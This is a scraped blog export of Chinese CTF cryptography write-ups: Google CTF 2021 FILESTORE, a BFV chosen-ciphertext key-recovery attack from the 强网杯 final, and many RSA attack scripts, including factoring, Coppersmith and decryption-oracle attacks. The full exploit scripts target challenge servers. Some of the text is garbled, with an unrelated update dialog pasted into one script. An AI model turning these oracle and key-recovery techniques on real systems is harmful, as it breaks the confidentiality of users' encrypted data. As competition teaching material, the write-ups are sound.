q) rsa = RSA.construct(rsa_components) public_key = rsa.exportKey() # 此rsa与上文随机生成的rsa相同 f = open(\u0026#34;public_key.key\u0026#34;, \u0026#34;w\u0026#34;) f.write(public_key.decode()) f.close() ","date":"27 July 2021","permalink":"/achieve/2019to2021/openssl/","section":"archive","summary":"","title":"openssl/pem"},{"content":"\r[toc]\ngoogle 的题真的太有意思了，可惜自己做出来的就只有这一个😥😥😥 有时间看看AESGCM怎么Oracle的\nFILESTORE # TASK\n# Copyright 2021 Google LLC # # Licensed under the Apache License, Version 2.0 (the \u0026#34;License\u0026#34;); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # https://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an \u0026#34;AS IS\u0026#34; BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. import os, secrets, string, time # from flag import flag flag = \u0026#39;CTF{CR1M3_0f_d3dup1ic4ti0n}\u0026#39; def main(): # It\u0026#39;s a tiny server... blob = bytearray(2**16) files = {} used = 0 # Use deduplication to save space. def store(data): nonlocal used MINIMUM_BLOCK = 16 MAXIMUM_BLOCK = 1024 part_list = [] while data: prefix = data[:MINIMUM_BLOCK] ind = -1 bestlen, bestind = 0, -1 while True: ind = blob.find(prefix, ind+1) if ind == -1: break length = len(os.path.commonprefix([data, bytes(blob[ind:ind+MAXIMUM_BLOCK])])) if length \u0026gt; bestlen: bestlen, bestind = length, ind if bestind != -1: part, data = data[:bestlen], data[bestlen:] part_list.append((bestind, bestlen)) else: part, data = data[:MINIMUM_BLOCK], data[MINIMUM_BLOCK:] blob[used:used+len(part)] = part part_list.append((used, len(part))) used += len(part) assert used \u0026lt;= len(blob) fid = \u0026#34;\u0026#34;.join(secrets.choice(string.ascii_letters+string.digits) for i in range(16)) files[fid] = part_list return fid def load(fid): # print(files) data = [] for ind, length in files[fid]: data.append(blob[ind:ind+length]) return b\u0026#34;\u0026#34;.join(data) print(\u0026#34;Welcome to our file storage solution.\u0026#34;) # Store the flag as one of the files. store(bytes(flag, \u0026#34;utf-8\u0026#34;)) while True: print() print(\u0026#34;Menu:\u0026#34;) print(\u0026#34;- load\u0026#34;) print(\u0026#34;- store\u0026#34;) print(\u0026#34;- status\u0026#34;) print(\u0026#34;- exit\u0026#34;) choice = input().strip().lower() if choice == \u0026#34;load\u0026#34;: print(\u0026#34;Send me the file id...\u0026#34;) fid = input().strip() data = load(fid) print(data.decode()) elif choice == \u0026#34;store\u0026#34;: print(\u0026#34;Send me a line of data...\u0026#34;) data = input().strip() fid = store(bytes(data, \u0026#34;utf-8\u0026#34;)) print(\u0026#34;Stored! Here\u0026#39;s your file id:\u0026#34;) print(fid) elif choice == \u0026#34;status\u0026#34;: print(\u0026#34;User: ctfplayer\u0026#34;) print(\u0026#34;Time: %s\u0026#34; % time.asctime()) kb = used / 1024.0 print(len(blob)) kb_all = len(blob) / 1024.0 print(\u0026#34;Quota: %0.3fkB/%0.3fkB\u0026#34; % (kb, kb_all)) print(\u0026#34;Files: %d\u0026#34; % len(files)) elif choice == \u0026#34;exit\u0026#34;: break else: print(\u0026#34;Nope.\u0026#34;) try: main() except Exception: print(\u0026#34;Nope.\u0026#34;) time.sleep(1) 设计了一个字符串储存系统,会复用flag的字符串来达到减少内存的目的,观察内存可以判断输入的字符串是否位flag的子字符串\nb\u0026#39;COqrVqqo621exq2q\\n\u0026#39; b\u0026#39;\\nMenu:\\n- load\\n- store\\n- status\\n- exit\\n\u0026#39; ic| flag_: \u0026#39;CTF{CR1M3_0f_d3d0f_d3dup1ic4ti0n0f_d3dup1ic4ti0n0f_d3dup1ic4ti0n0f_d3dup1ic4ti0n0f_d2\u0026#39; ic| mome: 0.041, base: 0.036 b\u0026#39;\\nFiles: 4\\n\\nMenu:\\n- load\\n- store\\n- status\\n- exit\\n\u0026#39; b\u0026#39;Send me a line of data...\\n\u0026#39; b\u0026#34;Stored! Here\u0026#39;s your file id:\\n\u0026#34; b\u0026#39;a6m4SqnnLQPIYEIx\\n\u0026#39; b\u0026#39;\\nMenu:\\n- load\\n- store\\n- status\\n- exit\\n\u0026#39; ic| flag_: \u0026#39;CTF{CR1M3_0f_d3d0f_d3dup1ic4ti0n0f_d3dup1ic4ti0n0f_d3dup1ic4ti0n0f_d3dup1ic4ti0n0f_d3\u0026#39; ic| mome: 0.041, base: 0.041 [*] Closed connection to 0.0.0.0 port 10001 [◐] Opening connection to 0.0.0.0 on port 10001: Done Traceback (most recent call last): exp\nflag_len = 26 import io from pwn import * from string import printable from MyRE import CatData host = \u0026#39;filestore.2021.ctfcompetition.com\u0026#39; prot= 1337 # flag=\u0026#39;CTF{CR1M3_0f_d3dup1ic4ti0n}\u0026#39; flag =\u0026#39;CTF\u0026#39; tab = \u0026#39;`{|}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\u0026#34;#$%\u0026amp;\\\u0026#39;()*+,-./:;\u0026lt;=\u0026gt;?@[\\\\]^_`~ \\t\\n\\r\\x0b\\x0c\u0026#39; def getmome(): print(io.recvuntil(\u0026#39;exit\\n\u0026#39;)) io.sendline(\u0026#39;status\u0026#39;) buf = io.recvuntil(\u0026#39;/64.000kB\u0026#39;) mome = float(CatData(buf,\u0026#39;Quota: \u0026#39;,\u0026#39;kB\u0026#39;)[0]) return mome def sendpayload(flag_): print(io.recvuntil(\u0026#39;exit\\n\u0026#39;)) io.sendline(\u0026#39;store\u0026#39;) print(io.recvline()) io.sendline(flag_) print(io.recvline()) id = io.recvline() print(id) # flag1 = \u0026#39;CTF123123\u0026#39; for i in range(100): io = remote(host, prot) base = getmome() for ch in printable: flag_ = flag+ch sendpayload(flag_) mome = getmome() from icecream import * ic(flag_) ic(mome,base) if(mome\u0026gt;base): base = mome else: flag = flag +ch io.close() break # flag1 = \u0026#39;{CR1M3_0f_d3dup1ic4ti0n}\u0026#39; 验证子序列的地方又一点问题，需要自行截断\n","date":"18 July 2021","permalink":"/achieve/ctf/google2021/","section":"archive","summary":"","title":"Google CTF 2021"},{"content":"\r2021第五届强网杯网络安全挑战赛决赛-crypto writeup # 第一次打强网杯，不垫底就算成功🐼🐼🐼\n蛮恶心的，差点因为服务器太慢出不来\nfrom sage.stats.distributions.discrete_gaussian_integer import DiscreteGaussianDistributionIntegerSampler from random import randint, getrandbits from secret import flag import sys import signal q = 2 ^ 54 t = 83 T = 3 d = 1024 delta = int(q / t) sigma = 2 P.\u0026lt;x\u0026gt; = PolynomialRing(ZZ) f = x ^ d + 1 R.\u0026lt;X\u0026gt; = P.quotient(f) D = DiscreteGaussianDistributionIntegerSampler(sigma=sigma) def sample1(): return R([D() for _ in range(d)]) def sample2(): return R([randint(0, q - 1) for _ in range(d)]) def sample3(x): return [randint(0, T - 1) for _ in range(x)] def Roundq(a): A = a.list() for i in range(len(A)): A[i] = A[i] % q if A[i] \u0026gt; (q / 2): A[i] = A[i] - q return R(A) def Roundt(a): A = a.list() for i in range(len(A)): A[i] = A[i] % t if A[i] \u0026gt; (t / 2): A[i] = A[i] - t return R(A) def keygen(): s = sample1() a = Roundq(sample2()) e = Roundq(sample1()) pk = [Roundq(-(a * s + e)), a] return s, pk def encrypt(m): u = sample1() e1 = sample1() e2 = sample1() return (Roundq(pk[0] * u + e1 + delta * m), Roundq(pk[1] * u + e2)) def baseT(n, b=T): v = [] while True: x = n // b y = n % b v.append(y) if x == 0: break n = x v.reverse() return v def mutual(k, c, s): tmp = t * Roundq(c[0] + c[1] * s) TMP = tmp.list() for i in range(len(TMP)): TMP[i] = round(TMP[i] / q) tmp2 = Roundt(R(TMP)) if tmp2[min(k, d)] == 0: print(True) else: print(False) signal.alarm(1024) sk, pk = keygen() print(f\u0026#34;public key:{pk[0].list()}, {pk[1].list()}\u0026#34;) namelist = [\u0026#34;admin\u0026#34;, \u0026#34;Adam\u0026#34;, \u0026#34;Bruce\u0026#34;, \u0026#34;Chris\u0026#34;, \u0026#34;David\u0026#34;] users = dict() for i in namelist: users[i] = getrandbits(32) menu = \u0026#39;\u0026#39;\u0026#39; 1.Add friends 2.find friends 3.Send Message 4.Regist\u0026#39;\u0026#39;\u0026#39; friends = set() while 1: print(f\u0026#34;Current number of users: {len(users)}\u0026#34;) print(menu) op = int(input(\u0026#34;\u0026gt;\u0026#34;).strip()) if op == 1: name = input(\u0026#34;name:\u0026#34;).strip() id_num = int(input(\u0026#34;id:\u0026#34;).strip()) if name in users.keys(): if id_num == users[name]: friends.add(name) else: print(\u0026#34;failed\u0026#34;) else: print(\u0026#34;failed\u0026#34;) elif op == 2: op2 = input(\u0026#34;recv ct?(Y/N)\u0026#34;).strip() if op2.upper() == \u0026#34;Y\u0026#34;: for name in users.keys(): id_num = users[name] x = baseT(id_num) y = x + sample3(d - len(x)) ct = encrypt(R(y)) print(ct[0].list(), ct[1].list()) op3 = input(\u0026#34;continue?(Y/N)\u0026#34;) if op3.upper() == \u0026#34;N\u0026#34;: break elif op3.upper() != \u0026#34;Y\u0026#34;: sys.exit(1) elif op2.upper() != \u0026#34;N\u0026#34;: sys.exit(1) for i in range(len(users)): c1 = input(\u0026#34;c1:\u0026#34;).strip().split(\u0026#34; \u0026#34;) c2 = input(\u0026#34;c2:\u0026#34;).strip().split(\u0026#34; \u0026#34;) cc1 = list(map(int, c1)) cc2 = list(map(int, c2)) mutual(i, [R(cc1), R(cc2)], sk) elif op == 3: name = input(\u0026#34;name:\u0026#34;).strip() message = input(\u0026#34;message:\u0026#34;).strip() if name not in friends: print(\u0026#34;failed\u0026#34;) else: if name == \u0026#34;admin\u0026#34;: if message == \u0026#34;give me the flag\u0026#34;: print(flag) else: print(f\u0026#34;send \u0026#39;{message}\u0026#39; to {name}\u0026#34;) elif op == 4: name = input(\u0026#34;name:\u0026#34;).strip() if name not in users.keys(): users[name] = getrandbits(32) print(\u0026#34;succeeded\u0026#34;) else: print(\u0026#34;failed\u0026#34;) else: sys.exit(1) 分析 # 需要我们泄露admin的id来添加一个friend来get massage\n这个题是一个经典的 CCA attack on FPSI\n针对全同态的一个攻击，但和常规情况不同的是在生成密钥时并未像标准加密系统中为了方便硬件运算使用0 1序列生成的多项式\n而是使用 [-7,-6, -5, -4, -3, -2, -1, 0, 1, 2, 3, 4, 5, 6,7] 得序列随机生成的私钥\nfrom sage.stats.distributions.discrete_gaussian_integer import DiscreteGaussianDistributionIntegerSampler D = DiscreteGaussianDistributionIntegerSampler(sigma=sigma) def sample_2(): return R([randint(0,1) for _ in range(d)]) def sample1(): return R([D() for _ in range(d)]) def keygen(): s = sample1() a = Roundq(sample2()) e = Roundq(sample1()) pk = [Roundq(-(a * s + e)), a] return s, pk 原版payload只需要给$t_i=m$\n可以恢复出密钥\npayload:\nM=delta//4+50 Recoverd_key=[] for i in range(d): Recoverd_key.append(recover_key(i)) def recover_key(i): t1=[0 for _ in range(d)] t1[i]=M t2=M cc0=pk[0]+R(t1) cc1=pk[1]+R(t2) ans = decrypt([cc0,cc1]).list() return ans[i] 但题目情况密钥并不为0 1 序列而且Oracle attack只能判断为该位上数字是否为0\n在改变t1[i]=M M的个数后发现以下性质：\n私钥\\ 返回的数据 M 2M 7M 5M 7 2 2 3 0 6 2 2 3 0 5 2 2 3 0 4 1 2 3 0 3 1 1 3 -1 2 1 1 2 -1 1 1 1 2 -1 0 0 1 2 -1 -1 0 0 2 -2 -2 0 0 1 -2 -3 -1 0 1 -2 -4 -1 -1 1 -2 -5 -1 -1 1 -3 -6 -1 -1 0 -3 -7 -1 -1 0 -3 只要按顺序 n = [8,7, 6, 5, 4, 3, 2, 1, 0, -1, -2, -3, -4, -5,-4] t1 = n*M 就可以对密钥进行一个padding Oracle\nexp # from pwn import * # from icecream import * from tqdm import tqdm from time import * p1 = time() # ----------------------------------- # get pk # io = remote(\u0026#39;0.0.0.0\u0026#39;,10001) io = remote(\u0026#39;172.20.5.23\u0026#39;,8001) q = 2 ^ 54 t = 83 T = 3 d = 1024 delta = int(q / t) sigma = 2 P.\u0026lt;x\u0026gt; = PolynomialRing(ZZ) f = x ^ d + 1 R.\u0026lt;X\u0026gt; = P.quotient(f) def Roundt(a): A = a.list() for i in range(len(A)): A[i] = A[i] % t if A[i] \u0026gt; (t / 2): A[i] = A[i] - t return R(A) def Roundq(a): A = a.list() for i in range(len(A)): A[i] = A[i] % q if A[i] \u0026gt; (q / 2): A[i] = A[i] - q return R(A) def mutual2(k, c, s): tmp = t * Roundq(c[0] + c[1] * s) TMP = tmp.list() for i in range(len(TMP)): TMP[i] = round(TMP[i] / q) tmp2 = Roundt(R(TMP)) return tmp2 io.recvuntil(\u0026#39;public key:[\u0026#39;) pk1 = io.recvuntil(\u0026#39;]\u0026#39;)[:-1] io.recvuntil(\u0026#39;[\u0026#39;) pk2 = io.recvuntil(\u0026#39;]\u0026#39;)[:-1] # print(pk1) # print(pk2[:100]) pk2 = [int(i) for i in pk2.split(b\u0026#39;,\u0026#39;)] # print(pk2[:10]) pk1 = [int(i) for i in pk1.split(b\u0026#39;,\u0026#39;)] pk=[R(pk1),R(pk2)] for i in range(1024-5): print(io.recvuntil(\u0026#39;\u0026gt;\u0026#39;)) io.sendline(\u0026#39;4\u0026#39;) io.sendline(str(i)) M=delta//4+50 padding = [8,7, 6, 5, 4, 3, 2, 1, 0, -1, -2, -3, -4, -5,-4] sks= [-7,-6, -5, -4, -3, -2, -1, 0, 1, 2, 3, 4, 5, 6,7] rk=[100 for i in range(1024)] for x in range(len(sks)): print(io.recvuntil(\u0026#39;\u0026gt;\u0026#39;)) io.sendline(\u0026#39;2\u0026#39;) print(io.recvuntil(\u0026#39;recv ct?(Y/N)\u0026#39;)) io.sendline(\u0026#39;Y\u0026#39;) sleep(1) print(io.recvuntil(\u0026#39;[\u0026#39;)) adminC1 = io.recvuntil(\u0026#39;]\u0026#39;)[:-1] print((io.recvuntil(\u0026#39;[\u0026#39;))) adminC2 = io.recvuntil(\u0026#39;]\u0026#39;)[:-1] adminC1 = [int(i) for i in adminC1.split(b\u0026#39;,\u0026#39;)] # print(pk2[:10]) adminC2 = [int(i) for i in adminC2.split(b\u0026#39;,\u0026#39;)] print(io.recvuntil(\u0026#39;continue?(Y/N)\u0026#39;)) io.sendline(\u0026#39;N\u0026#39;) pad = padding[x] print(f\u0026#39;第{x}个了\u0026#39;) for k in tqdm(range(1024)): t1=[0 for _ in range(d)] t1[k]=pad*M t2=M # ================================ cc0=(pk[0]+R(t1)).list() payload_c1 = \u0026#39;\u0026#39; for i in cc0: payload_c1 += str(i) payload_c1+=\u0026#39; \u0026#39; payload_c2 = \u0026#39;\u0026#39; cc1=(pk[1]+R(t2)).list() for i in cc1: payload_c2 += str(i) payload_c2+=\u0026#39; \u0026#39; io.recvuntil(\u0026#39;c1:\u0026#39;) io.sendline(payload_c1) # sleep(1) io.recvuntil(\u0026#39;c2:\u0026#39;) io.sendline(payload_c2) # ===================================== fb = io.recvline() if(b\u0026#39;True\u0026#39; in fb and rk[k]==100): rk[k] = sks[x] # input() for i in range(len(rk)): if(rk[i]==100): rk[i]=7 sk = R(rk) adminCT=[R(adminC1),R(adminC2)] # cc0=R(ct[0].list()) # cc1=R(ct[1].list()) ans = mutual2(0,adminCT,sk) x = ans.list()[:25] admin_id =0 use=[] ids=[] for i in x: admin_id *= T admin_id += i use.append(i) ids.append(admin_id) print(rk) print(ids) # io.interactive() sleep(1) for id in ids: print(io.recvuntil(\u0026#39;\u0026gt;\u0026#39;)) io.sendline(\u0026#39;1\u0026#39;) print(io.recvuntil(\u0026#39;name:\u0026#39;)) io.sendline(\u0026#39;admin\u0026#39;) print(io.recvuntil(\u0026#39;id:\u0026#39;)) io.sendline(str(id)) print(io.recvline()) print(io.recvuntil(\u0026#39;\u0026gt;\u0026#39;)) io.sendline(\u0026#39;3\u0026#39;) io.sendlineafter(\u0026#39;name:\u0026#39;,\u0026#39;admin\u0026#39;) io.sendlineafter(\u0026#39;message:\u0026#39;,\u0026#39;give me the flag\u0026#39;) sleep(1) print(io.recv(2048)) p2 = time() print(p2-p1) FLAG\nb\u0026#39;name:\u0026#39; b\u0026#39;id:\u0026#39; b\u0026#39;failed\\n\u0026#39; b\u0026#39;Current number of users: 1024\\n\\n1.Add friends\\n2.find friends\\n3.Send Message\\n4.Regist\\n\u0026gt;\u0026#39; b\u0026#39;name:\u0026#39; b\u0026#39;id:\u0026#39; b\u0026#39;failed\\n\u0026#39; b\u0026#39;Current number of users: 1024\\n\\n1.Add friends\\n2.find friends\\n3.Send Message\\n4.Regist\\n\u0026gt;\u0026#39; b\u0026#39;flag{CCA_attack_BFV_123698745}\\n\u0026#39; [*] Closed connection to 172.20.5.23 port 8001 /mnt/c/U/1/De/qwb决赛/bfv 有个小地方每处理好，不知道为什么sk = 7不能完全正确的Oracle，只能手动恢复了\n服务器OI速度及其慢 等了半天才打通\n","date":"11 July 2021","permalink":"/achieve/ctf/qwbs5wp/","section":"archive","summary":"","title":"Writeup for BFV in 强网杯S5 final"},{"content":"\rgkctf2021 6-25 # 太菜了,只做了两个题,时间还不够了呜呜\npythonrandom 通杀脚本 # from randcrack import RandCrack rc = RandCrack() for i in data: r = bin(int(i))[2:].zfill(64) r1 = r[:32] r2 = r[32:] rc.submit(int(r2, 2)) rc.submit(int(r1, 2)) tmp = rc.predict_getrandbits(64) rrrrsa # 小数论题\n注意mod n和mod q之间的关系\nfrom libnum import * from Crypto.Util.number import * from icecream import * e = 65537 c=13492392717469817866883431475453770951837476241371989714683737558395769731416522300851917887957945766132864151382877462142018129852703437240533684604508379950293643294877725773675505912622208813435625177696614781601216465807569201380151669942605208425645258372134465547452376467465833013387018542999562042758 n1=75003557379080252219517825998990183226659117019770735080523409561757225883651040882547519748107588719498261922816865626714101556207649929655822889945870341168644508079317582220034374613066751916750036253423990673764234066999306874078424803774652754587494762629397701664706287999727238636073466137405374927829 c1=68111901092027813007099627893896838517426971082877204047110404787823279211508183783468891474661365139933325981191524511345219830693064573462115529345012970089065201176142417462299650761299758078141504126185921304526414911455395289228444974516503526507906721378965227166653195076209418852399008741560796631569 cc1=23552090716381769484990784116875558895715552896983313406764042416318710076256166472426553520240265023978449945974218435787929202289208329156594838420190890104226497263852461928474756025539394996288951828172126419569993301524866753797584032740426259804002564701319538183190684075289055345581960776903740881951 cc2=52723229698530767897979433914470831153268827008372307239630387100752226850798023362444499211944996778363894528759290565718266340188582253307004810850030833752132728256929572703630431232622151200855160886614350000115704689605102500273815157636476901150408355565958834764444192860513855376978491299658773170270 # hint1 = pow(2020 * p1 + q1, 202020, n1) # hint2 = pow(2021 * p1 + 212121, q1, n1) a = 2020 e1 = 202020 e2 = 212121 tmp = ((cc2-e2)*a*invmod(a+1,n1))%n1 tmp = pow(tmp,e1,n1)-cc1%n1 q1 = gcd(tmp,n1) p1 = n1//q1 ic(q1,n1%q1) phi1 = (p1-1)*(q1-1) d1 = invmod(e,phi1) P = pow(c1,d1,n1) a = 2020 e1 = 202020 e2 = 212121 t = e1*e2 n2=114535923043375970380117920548097404729043079895540320742847840364455024050473125998926311644172960176471193602850427607899191810616953021324742137492746159921284982146320175356395325890407704697018412456350862990849606200323084717352630282539156670636025924425865741196506478163922312894384285889848355244489 c2=67054203666901691181215262587447180910225473339143260100831118313521471029889304176235434129632237116993910316978096018724911531011857469325115308802162172965564951703583450817489247675458024801774590728726471567407812572210421642171456850352167810755440990035255967091145950569246426544351461548548423025004 cc1=25590923416756813543880554963887576960707333607377889401033718419301278802157204881039116350321872162118977797069089653428121479486603744700519830597186045931412652681572060953439655868476311798368015878628002547540835719870081007505735499581449077950263721606955524302365518362434928190394924399683131242077 cc2=104100726926923869566862741238876132366916970864374562947844669556403268955625670105641264367038885706425427864941392601593437305258297198111819227915453081797889565662276003122901139755153002219126366611021736066016741562232998047253335141676203376521742965365133597943669838076210444485458296240951668402513 f1 = cc2 *pow(a,e2,n2)*invmod(pow(a+1,e2,n2),n2)%n2 tmp = (pow(f1,e1,n2)-pow(cc1,e2,n2))%n2 q2 = gcd(tmp,n2) ic(q2,n2%q2) p2 = n2//q2 phi2 = (p2-1)*(q2-1) d2 = invmod(e,phi2) Q = pow(c2,d2,n2) e = 65537 c=13492392717469817866883431475453770951837476241371989714683737558395769731416522300851917887957945766132864151382877462142018129852703437240533684604508379950293643294877725773675505912622208813435625177696614781601216465807569201380151669942605208425645258372134465547452376467465833013387018542999562042758 p=P q=Q n=p*q phi = (p-1)*(q-1) d = invmod(e,phi) m = pow(c,d,n) print(long_to_bytes(m)) # GKCTF{f64310b5-d5e6-45cb-ae69-c86600cdf8d8} ","date":"10 July 2021","permalink":"/achieve/ctf/dozer2021/","section":"archive","summary":"gkctf2021 6-25 # 太菜了,只做了两个题,时间还不够了呜呜","title":"Writeup for DozerCtf 2021"},{"content":" 一些RSA垃圾题\nnormal # rsa1 p-q # p q相差太小,直接用费马方法分解\nfrom Crypto.Util.number import * from gmpy2 import next_prime import random ## p = getPrime(512) ## q = next_prime(next_prime(p) + random.randint(2 ** 10, 2 ** 15)) ## q = p+a ## 费马方法分解n def fermat_factors(n): assert n % 2 != 0 import gmpy2 a = gmpy2.isqrt(n) b2 = gmpy2.square(a) - n while not gmpy2.is_square(b2): a += 1 b2 = gmpy2.square(a) - n factor1 = a + gmpy2.isqrt(b2) factor2 = a - gmpy2.isqrt(b2) return int(factor1), int(factor2) n = 58469790767119395443619182703965753536155769938155967209185013051235434307443199577853487462032941284716788878629026151008480533108948515487216969655522610052504252431114883354036178747396340974017983797943561003427523330887483816814526450542542017962396566419907954878575664402091503063651747784708370988551 e = 65537 c = 5210792629811531618748922441951091043558836768927486327066208193531783313814007532484357434613606536101786384803692759877417618085066111343186477103523861319942108843549903015256729449831006717779587476869110804323636543879652560144414279029912184440958215613248124698646241943161894215574508920550451749893 q, p = fermat_factors(n) d = inverse(e, (p - 1) * (q - 1)) print(long_to_bytes(pow(c, d, n))) flag b\u0026rsquo;flag{this_is_flag}'\nrsa4 ed2n # 用以下脚本来求qp\ndef getpq(n,e,d): while True: k = e * d - 1 g = random.randint(0, n) while k%2==0: k=k//2 temp=gmpy2.powmod(g,k,n)-1 if gmpy2.gcd(temp,n)\u0026gt;1 and temp!=0: return gmpy2.gcd(temp,n) rsa 5 EeE # 小公钥加密，尝试队c直接开三次方\nc=74802199268289650659966949121722134398741724016029787984879330914681382911392412708797079066742193788624174545434065877798917466086322130161380099507267024211772226618358174709389234588799169125 import gmpy2 m = gmpy2.iroot(c,3) print(m) rsa7 Radin # 使用python脚本 代码：\nfrom Crypto.PublicKey import RSA rsakey = RSA.importKey(open(\u0026#34;public.key\u0026#34;, \u0026#34;r\u0026#34;).read()) n = rsakey.n e = rsakey.e print(,n,e) 带私钥版本：\nrsakey = RSA.importKey(open(\u0026#34;prikey.key\u0026#34;, \u0026#34;r\u0026#34;).read()) n = rsakey.n e = rsakey.e d = rsakey.d q = rsakey.q p = rsakey.p print(e,d,n,p,q) Rabin算法的解密原理是：假设我们知道m%p 和 m%q，那么拿着中国剩余定理立刻可以知道 m%n的值。又有m\u0026lt;n，则m的值就直接拿到了，岂不美哉？\n实际上标准的Rabin算法的解密会得到四个结果。我们一一对比就可以找到flag\n专门用于解radin的脚本：\nfrom Crypto.Util.number import * def squareMod(c, mod): ## 模意义下开根，找到 x, 使得 x^2 % mod = c assert(mod % 4 == 3) res = gmpy2.powmod(c, (mod+1)//4, mod) return res, mod - res def getPlaintext(x, y, p, q): ## 假设 m%p=x, m%q=y, 求明文 res = x*q*gmpy2.invert(q, p) + y*p*gmpy2.invert(p, q) return res % (p*q) def solve(c, p, q): ## 已知 p,q, 解密 c px = squareMod(c, p) py = squareMod(c, q) for x in px: for y in py: yield getPlaintext(x, y, p, q) c = open(\u0026#39;flag.enc\u0026#39;, \u0026#39;rb\u0026#39;).read() ## print(c) c = int(c.hex() ,16) p = 275127860351348928173285174381581152299 q = 319576316814478949870590164193048041239 for msg in solve(c, p, q): print(long_to_bytes(msg)) RSA oracle # rsa10 nctf2020 # from Crypto.Util.number import getPrime, inverse, GCD, bytes_to_long # from secret import flag flag = b\u0026#39;flag{xxxxxxxxxxxxxxxxxx}\u0026#39; m = bytes_to_long(flag) while True: p = getPrime(512) q = getPrime(512) n = p * q e = getPrime(32) if GCD((p-1)*(q-1), e) == 1: d = inverse(e, (p-1)*(q-1)) break print(e, n, pow(m, e, n), sep=\u0026#39;\\n\u0026#39;) for _ in range(10000): cc = int(input(\u0026#34;\u0026gt; \u0026#34;)) mm = int.to_bytes(pow(cc, d, n), 1024//8, \u0026#39;big\u0026#39;) print(mm.startswith(b\u0026#34;\\x00\u0026#34;)) 先确定flag长度，用二分法无限逼近flag的值\nfrom pwn import * from Crypto.Util.number import * r = remote(\u0026#34;0.0.0.0\u0026#34;,10001) buf = r.recvline() e = int(buf.decode().strip()) n = int(r.recvline().decode().strip()) c = int(r.recvline().decode().strip()) max = 2**826 min = 2**822 while (max-min\u0026gt;1): mid = (max+min)//2 temp = (pow(mid,e,n)*c)%n r.sendline(str(temp)) data = r.recvline() print(data) ## data = r.recvline() if(b\u0026#39;True\u0026#39; in data): min = mid else: max = mid print(min,max) print(long_to_bytes(2**1016//min)) print(long_to_bytes(2**1016//max)) rsa 格规约攻击 # rsa 12 fac with hit # 利用coppersmith获取p\nn = 0x5894f869d1aecee379e2cb60ff7314d18dbd383e0c9f32e7f7b4dc8bd47535d4f3512ce6a23b0251049346fede745d116ba8d27bcc4d7c18cfbd86c7d065841788fcd600d5b3ac5f6bb1e111f265994e550369ddd86e20f615606bf21169636d153b6dfee4472b5a3cb111d0779d02d9861cc724d389eb2c07a71a7b3941da7d p_fake = 0x5d33504b4e3bd2ffb628b5c447c4a7152a9f37dc4bcc8f376f64000fa96eb97c0af445e3b2c03926a4aa4542918c601000000000000000000000000000000000 pbits = p_fake.nbits() ##kbits = 900 kbits = 128 ##p失去的低位 pbar = p_fake \u0026amp; (2^pbits-2^kbits) print \u0026#34;upper %d bits (of %d bits) is given\u0026#34; % (pbits-kbits, pbits) PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) f = x + pbar x0 = f.small_roots(X=2^kbits, beta=0.4)[0] ## find root \u0026lt; 2^kbits with factor \u0026gt;= n^0.3 p= x0 + pbar print p rsa13 bigger d # rsa14Partial Key # rsa 15 Wiener plas # rsa17 Linear math # 一次论文攻击方式复现\n[Window Title] Update Available [Main Instruction] A new version of Sublime Text is available, download now? [Download] [取消] from libnum.common import gcd from data import b,c from gmpy2 import * from Crypto.Util.number import * import time import libnum n = 110384114201475663616747380525627123445579689285630886040168434260829091685143698389730908307058264757595472490646553684116819186297946861038089011634839837455006286876809812362253126020273844190061817352704628672775002140119322152762726493845024580159588306209024297015077439731424454595795781027348887941827 a = 877 t = 541 e = 0x101 strat = time.time() Pk = [] for k in range(e): tot = 1 ## print(k) for k1 in range(e): if k!= k1 : ## print(gcd((b[k]-b[k1])%n,n)) tot *= libnum.invmod((b[k]-b[k1])%n,n) tot %= n tot %= n Pk.append(tot) v=0 for k in range(e): v += (pow(b[k],e,n)*Pk[k])%n v %= n tmp = 0 for k in range(e): tmp += (c[k]*Pk[k])%n tmp %=n x = ((libnum.invmod(e,n)*(tmp-v))%n)%n from Crypto.Util.number import * print(x*libnum.invmod(a,n)%n) end = time.time() print(end - strat) rsa21 half p # 题目给出了dp和一对公钥\n已知\n$dp+k*(p-1)=d;mod;p-1$\n$ed=1=k*(p-1)(q-1)+1;mod;(p-1)(q-1)$\n$ed=e*dp;mod;p-1$\n$k_1*(p-1)(q-1)+1=k_2(p-1)+dpe$\n可写为\n$(p-1)=(dp*e-1)/x$\n由式子可知x小于e，若e较小，对e遍历就可以得到p q\nimport gmpy2 from Crypto.Util.number import bytes_to_long, long_to_bytes n = 82459095549748227929288050555498384469575272567666482697551651645093561076800636903414213079689167610546931321044499258842967876311854597995877424799325872420793993678223520863171113084551896184041824490162048421763392587578106892564418656377436734864113039255928135310184434095934015134373147964955532123881 dp = 2154496166987404807570061246274794378102105725450715702694091896971248930139905533434215910296644935717134018627774991211321921063947893592214392985692261 e = 65537 c = 31011021137992452431076840432639365407713019786586660934070807380893254876293446768579394082019427413952266893686196624551302747440454439484165217862543849146153312457417254751109386482402322429697563463538223851046832003654970628089968896006236813877570702218773093761582493452679741468626986210359922340714 for i in range(1, e): if (e * dp - 1) % i == 0: p = (e * dp - 1) // i + 1 if n % p == 0: q = n // p phin = (p - 1) * (q - 1) d = gmpy2.invert(e, phin) print(long_to_bytes(pow(c, d, n))) break rsa26 partial message # 构造多项式$f=（m+x）^3-c=0;mod;n$\ndef phase2(high_m, n, c): R.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n), implementation=\u0026#39;NTL\u0026#39;) m = high_m + x M = (m^3 - c).small_roots()[0] print(M) n = 13112061820685643239663831166928327119579425830632458568801544406506769461279590962772340249183569437559394200635526183698604582385769381159563710823689417274479549627596095398621182995891454516953722025068926293512505383125227579169778946631369961753587856344582257683672313230378603324005337788913902434023431887061454368566100747618582590270385918204656156089053519709536001906964008635708510672550219546894006091483520355436091053866312718431318498783637712773878423777467316605865516248176248780637132615807886272029843770186833425792049108187487338237850806203728217374848799250419859646871057096297020670904211 c = 15987554724003100295326076036413163634398600947695096857803937998969441763014731720375196104010794555868069024393647966040593258267888463732184495020709457560043050577198988363754703741636088089472488971050324654162166657678376557110492703712286306868843728466224887550827162442026262163340935333721705267432790268517 high_m = 0x464c41477b325e38727361373538393639336663363839633737633566353236326436000000000000000000 from Crypto.Util.number import * 